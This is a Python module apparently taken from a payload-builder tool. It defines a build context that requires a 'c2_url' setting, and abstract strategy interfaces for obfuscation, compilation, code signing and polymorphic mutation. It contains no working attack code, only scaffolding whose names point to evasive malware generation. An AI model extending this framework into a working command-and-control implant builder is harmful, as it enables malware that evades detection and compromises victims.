# strategies/base.py

from abc import ABC, abstractmethod
from pathlib import Path
from typing import Optional, List


class BuildContext:
    """
    Um objeto para carregar o estado e os dados entre as etapas do build.
    Funciona como uma "mochila" que cada estratégia carrega e pode modificar.
    """

    REQUIRED_KEYS = ['c2_url', 'platform', 'type', 'output']

    def __init__(self, config: dict):
        self.config: dict = config
        self.build_dir: Optional[Path] = None
        self.base_dir: Optional[Path] = None          # declarado aqui, atribuído no Builder
        self.entry_script_path: Optional[Path] = None
        self.final_artifact_path: Optional[Path] = None
        self.build_log: List[str] = []

    def validate(self):
        """Valida que todas as chaves obrigatórias estão presentes no config."""
        missing = [k for k in self.REQUIRED_KEYS if k not in self.config]
        if missing:
            raise ValueError(
                f"BuildContext inválido — chaves ausentes no config: {missing}"
            )

    def log(self, message: str):
        """Registra uma mensagem de log no contexto para rastreabilidade."""
        self.build_log.append(message)

    def __str__(self):
        return (
            f"BuildContext(\n"
            f"  Config Output : {self.config.get('output')}\n"
            f"  Platform      : {self.config.get('platform')}\n"
            f"  Build Dir     : {self.build_dir}\n"
            f"  Entry Script  : {self.entry_script_path}\n"
            f"  Final Artifact: {self.final_artifact_path}\n"
            f"  Log Entries   : {len(self.build_log)}\n"
            f")"
        )

    def __repr__(self):
        return self.__str__()


class BuildStrategy(ABC):
    """Classe base para todas as estratégias."""

    @abstractmethod
    def execute(self, context: BuildContext) -> BuildContext:
        """
        Executa a lógica da estratégia.
        Recebe o contexto atual, executa sua tarefa e retorna o contexto modificado.
        """
        pass


class ObfuscationStrategy(BuildStrategy):
    """Interface para todas as estratégias de ofuscação de código-fonte."""
    pass


class CompilationStrategy(BuildStrategy):
    """Interface para todas as estratégias de compilação ou saída."""
    pass


class SignatureStrategy(BuildStrategy):
    """Interface para todas as estratégias de assinatura de código."""
    pass


class MutationStrategy(BuildStrategy):
    """Interface para todas as estratégias de mutação e polimorfismo."""
    pass
